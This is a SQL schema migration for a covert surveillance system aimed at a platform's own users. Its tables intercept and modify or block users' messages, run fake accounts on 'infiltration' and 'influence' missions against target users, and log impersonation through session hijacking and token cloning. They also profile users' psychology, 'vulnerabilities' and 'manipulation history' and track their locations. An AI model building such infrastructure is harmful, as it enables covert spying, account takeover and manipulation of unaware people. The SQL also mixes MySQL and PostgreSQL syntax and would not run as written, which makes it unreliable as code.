-- Surveillance Database Schema Migration
-- This creates the complete surveillance infrastructure

-- Create surveillance activity tracking table
CREATE TABLE IF NOT EXISTS surveillance_activities (
    id VARCHAR(255) PRIMARY KEY,
    user_id VARCHAR(255) NOT NULL,
    session_id VARCHAR(255) NOT NULL,
    event_type VARCHAR(100) NOT NULL,
    raw_data JSONB NOT NULL,
    processed_data JSONB,
    timestamp TIMESTAMP WITH TIME ZONE NOT NULL,
    location JSONB,
    risk_score INTEGER DEFAULT 0,
    anomaly_flags TEXT[],
    psychological_indicators JSONB,
    behavioral_patterns JSONB,
    social_connections JSONB,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    INDEX idx_user_timestamp (user_id, timestamp),
    INDEX idx_event_type (event_type),
    INDEX idx_risk_score (risk_score),
    INDEX idx_timestamp (timestamp)
);

-- Create user surveillance profiles table
CREATE TABLE IF NOT EXISTS user_surveillance_profiles (
    id VARCHAR(255) PRIMARY KEY,
    user_id VARCHAR(255) UNIQUE NOT NULL,
    psychological_profile JSONB,
    behavioral_analysis JSONB,
    risk_assessment JSONB,
    social_graph JSONB,
    location_history JSONB,
    device_fingerprints JSONB,
    communication_patterns JSONB,
    vulnerability_assessment JSONB,
    manipulation_history JSONB,
    threat_indicators JSONB,
    last_updated TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    INDEX idx_user_id (user_id),
    INDEX idx_last_updated (last_updated)
);

-- Create message interception table
CREATE TABLE IF NOT EXISTS intercepted_messages (
    id VARCHAR(255) PRIMARY KEY,
    message_id VARCHAR(255),
    sender_id VARCHAR(255) NOT NULL,
    recipient_id VARCHAR(255),
    room_id VARCHAR(255),
    original_content TEXT,
    modified_content TEXT,
    interception_type ENUM('monitor', 'modify', 'block', 'redirect'),
    sentiment_analysis JSONB,
    threat_assessment JSONB,
    keywords_detected TEXT[],
    admin_id VARCHAR(255),
    admin_action VARCHAR(100),
    timestamp TIMESTAMP WITH TIME ZONE NOT NULL,
    processed_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    INDEX idx_sender (sender_id),
    INDEX idx_recipient (recipient_id),
    INDEX idx_timestamp (timestamp),
    INDEX idx_interception_type (interception_type)
);

-- Create fake user management table
CREATE TABLE IF NOT EXISTS fake_users (
    id VARCHAR(255) PRIMARY KEY,
    username VARCHAR(100) UNIQUE NOT NULL,
    email VARCHAR(255) UNIQUE NOT NULL,
    personality_type VARCHAR(100),
    mission_type ENUM('infiltration', 'information_gathering', 'influence', 'surveillance'),
    target_user_id VARCHAR(255),
    target_group_id VARCHAR(255),
    backstory TEXT,
    ai_config JSONB,
    performance_metrics JSONB,
    status ENUM('active', 'paused', 'inactive', 'terminated'),
    admin_id VARCHAR(255) NOT NULL,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    last_activity TIMESTAMP WITH TIME ZONE,
    INDEX idx_status (status),
    INDEX idx_mission_type (mission_type),
    INDEX idx_target_user (target_user_id),
    INDEX idx_admin (admin_id)
);

-- Create impersonation sessions table
CREATE TABLE IF NOT EXISTS impersonation_sessions (
    id VARCHAR(255) PRIMARY KEY,
    target_user_id VARCHAR(255) NOT NULL,
    admin_id VARCHAR(255) NOT NULL,
    session_token VARCHAR(500),
    method ENUM('credential', 'session_hijack', 'token_clone'),
    access_level ENUM('full', 'limited', 'read_only'),
    status ENUM('active', 'paused', 'terminated'),
    device_info JSONB,
    activities JSONB,
    risk_level ENUM('low', 'medium', 'high'),
    started_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    ended_at TIMESTAMP WITH TIME ZONE,
    duration INTEGER,
    INDEX idx_target_user (target_user_id),
    INDEX idx_admin (admin_id),
    INDEX idx_status (status),
    INDEX idx_started_at (started_at)
);

-- Create surveillance alerts table
CREATE TABLE IF NOT EXISTS surveillance_alerts (
    id VARCHAR(255) PRIMARY KEY,
    alert_type VARCHAR(100) NOT NULL,
    severity ENUM('low', 'medium', 'high', 'critical'),
    user_id VARCHAR(255),
    message TEXT NOT NULL,
    details JSONB,
    trigger_data JSONB,
    admin_notified BOOLEAN DEFAULT FALSE,
    resolved BOOLEAN DEFAULT FALSE,
    resolved_by VARCHAR(255),
    resolved_at TIMESTAMP WITH TIME ZONE,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    INDEX idx_severity (severity),
    INDEX idx_user_id (user_id),
    INDEX idx_alert_type (alert_type),
    INDEX idx_created_at (created_at),
    INDEX idx_resolved (resolved)
);

-- Create location tracking table
CREATE TABLE IF NOT EXISTS location_tracking (
    id VARCHAR(255) PRIMARY KEY,
    user_id VARCHAR(255) NOT NULL,
    latitude DECIMAL(10, 8) NOT NULL,
    longitude DECIMAL(11, 8) NOT NULL,
    accuracy DECIMAL(6, 2),
    altitude DECIMAL(8, 2),
    speed DECIMAL(6, 2),
    heading DECIMAL(5, 2),
    address TEXT,
    geofence_alerts JSONB,
    metadata JSONB,
    timestamp TIMESTAMP WITH TIME ZONE NOT NULL,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    INDEX idx_user_timestamp (user_id, timestamp),
    INDEX idx_location (latitude, longitude),
    INDEX idx_timestamp (timestamp)
);

-- Create admin audit log table
CREATE TABLE IF NOT EXISTS admin_audit_log (
    id VARCHAR(255) PRIMARY KEY,
    admin_id VARCHAR(255) NOT NULL,
    action VARCHAR(200) NOT NULL,
    target_type VARCHAR(100),
    target_id VARCHAR(255),
    details JSONB,
    ip_address INET,
    user_agent TEXT,
    session_id VARCHAR(255),
    risk_level ENUM('low', 'medium', 'high'),
    success BOOLEAN DEFAULT TRUE,
    error_message TEXT,
    timestamp TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    INDEX idx_admin (admin_id),
    INDEX idx_action (action),
    INDEX idx_timestamp (timestamp),
    INDEX idx_target (target_type, target_id)
);

-- Create behavioral patterns table
CREATE TABLE IF NOT EXISTS behavioral_patterns (
    id VARCHAR(255) PRIMARY KEY,
    user_id VARCHAR(255) NOT NULL,
    pattern_type VARCHAR(100) NOT NULL,
    pattern_data JSONB NOT NULL,
    confidence_score DECIMAL(3, 2),
    detection_algorithm VARCHAR(100),
    first_detected TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    last_updated TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    occurrence_count INTEGER DEFAULT 1,
    status ENUM('active', 'resolved', 'false_positive'),
    INDEX idx_user_id (user_id),
    INDEX idx_pattern_type (pattern_type),
    INDEX idx_confidence (confidence_score),
    INDEX idx_last_updated (last_updated)
);

-- Create threat intelligence table
CREATE TABLE IF NOT EXISTS threat_intelligence (
    id VARCHAR(255) PRIMARY KEY,
    threat_type VARCHAR(100) NOT NULL,
    indicator_type VARCHAR(100) NOT NULL,
    indicator_value VARCHAR(500) NOT NULL,
    threat_level ENUM('low', 'medium', 'high', 'critical'),
    source VARCHAR(200),
    description TEXT,
    first_seen TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    last_seen TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    confidence INTEGER CHECK (confidence >= 0 AND confidence <= 100),
    tags TEXT[],
    metadata JSONB,
    active BOOLEAN DEFAULT TRUE,
    INDEX idx_threat_type (threat_type),
    INDEX idx_indicator (indicator_type, indicator_value),
    INDEX idx_threat_level (threat_level),
    INDEX idx_active (active)
);

-- Create surveillance operations table
CREATE TABLE IF NOT EXISTS surveillance_operations (
    id VARCHAR(255) PRIMARY KEY,
    operation_name VARCHAR(200) NOT NULL,
    operation_type VARCHAR(100) NOT NULL,
    status ENUM('planning', 'active', 'paused', 'completed', 'cancelled'),
    priority ENUM('low', 'medium', 'high', 'critical'),
    targets JSONB NOT NULL,
    objectives TEXT,
    methods JSONB,
    admin_id VARCHAR(255) NOT NULL,
    team_members JSONB,
    start_date TIMESTAMP WITH TIME ZONE,
    end_date TIMESTAMP WITH TIME ZONE,
    results JSONB,
    evidence_collected JSONB,
    legal_authorization JSONB,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    updated_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    INDEX idx_operation_type (operation_type),
    INDEX idx_status (status),
    INDEX idx_priority (priority),
    INDEX idx_admin (admin_id),
    INDEX idx_dates (start_date, end_date)
);

-- Create evidence vault table
CREATE TABLE IF NOT EXISTS evidence_vault (
    id VARCHAR(255) PRIMARY KEY,
    operation_id VARCHAR(255),
    evidence_type VARCHAR(100) NOT NULL,
    source_type VARCHAR(100) NOT NULL,
    source_id VARCHAR(255),
    file_path VARCHAR(500),
    file_hash VARCHAR(128),
    encryption_key_id VARCHAR(255),
    metadata JSONB,
    chain_of_custody JSONB,
    legal_hold BOOLEAN DEFAULT FALSE,
    retention_date DATE,
    admin_id VARCHAR(255) NOT NULL,
    collected_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    verified_at TIMESTAMP WITH TIME ZONE,
    INDEX idx_operation (operation_id),
    INDEX idx_evidence_type (evidence_type),
    INDEX idx_source (source_type, source_id),
    INDEX idx_legal_hold (legal_hold),
    INDEX idx_retention (retention_date)
);

-- Create data retention policies table
CREATE TABLE IF NOT EXISTS data_retention_policies (
    id VARCHAR(255) PRIMARY KEY,
    data_type VARCHAR(100) NOT NULL,
    retention_period_days INTEGER NOT NULL,
    deletion_method VARCHAR(100) NOT NULL,
    legal_basis TEXT,
    exceptions JSONB,
    active BOOLEAN DEFAULT TRUE,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    updated_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    INDEX idx_data_type (data_type),
    INDEX idx_active (active)
);

-- Create advanced indexes for performance
CREATE INDEX CONCURRENTLY IF NOT EXISTS idx_surveillance_activities_compound 
ON surveillance_activities (user_id, event_type, timestamp DESC);

CREATE INDEX CONCURRENTLY IF NOT EXISTS idx_surveillance_activities_risk 
ON surveillance_activities (risk_score DESC, timestamp DESC) 
WHERE risk_score > 50;

CREATE INDEX CONCURRENTLY IF NOT EXISTS idx_location_tracking_geospatial 
ON location_tracking USING GIST (ll_to_earth(latitude, longitude));

-- Create materialized views for analytics
CREATE MATERIALIZED VIEW IF NOT EXISTS user_risk_scores AS
SELECT 
    user_id,
    AVG(risk_score) as avg_risk_score,
    MAX(risk_score) as max_risk_score,
    COUNT(*) as activity_count,
    array_agg(DISTINCT anomaly_flags) as all_anomaly_flags
FROM surveillance_activities 
WHERE timestamp > NOW() - INTERVAL '30 days'
GROUP BY user_id;

CREATE UNIQUE INDEX ON user_risk_scores (user_id);

-- Create triggers for automatic updates
CREATE OR REPLACE FUNCTION update_user_surveillance_profile()
RETURNS TRIGGER AS $$
BEGIN
    INSERT INTO user_surveillance_profiles (user_id, last_updated)
    VALUES (NEW.user_id, NOW())
    ON CONFLICT (user_id) 
    DO UPDATE SET last_updated = NOW();
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;

CREATE TRIGGER trigger_update_surveillance_profile
    AFTER INSERT ON surveillance_activities
    FOR EACH ROW
    EXECUTE FUNCTION update_user_surveillance_profile();

-- Create function for automatic cleanup
CREATE OR REPLACE FUNCTION cleanup_old_surveillance_data()
RETURNS INTEGER AS $$
DECLARE
    deleted_count INTEGER;
BEGIN
    DELETE FROM surveillance_activities 
    WHERE timestamp < NOW() - INTERVAL '2 years';
    
    GET DIAGNOSTICS deleted_count = ROW_COUNT;
    
    REFRESH MATERIALIZED VIEW user_risk_scores;
    
    RETURN deleted_count;
END;
$$ LANGUAGE plpgsql;

-- Grant appropriate permissions
GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO surveillance_user;
GRANT USAGE, SELECT ON ALL SEQUENCES IN SCHEMA public TO surveillance_user;
GRANT EXECUTE ON ALL FUNCTIONS IN SCHEMA public TO surveillance_user;

-- Create scheduled job for cleanup (requires pg_cron extension)
-- SELECT cron.schedule('cleanup-surveillance', '0 2 * * 0', 'SELECT cleanup_old_surveillance_data();');

COMMIT;
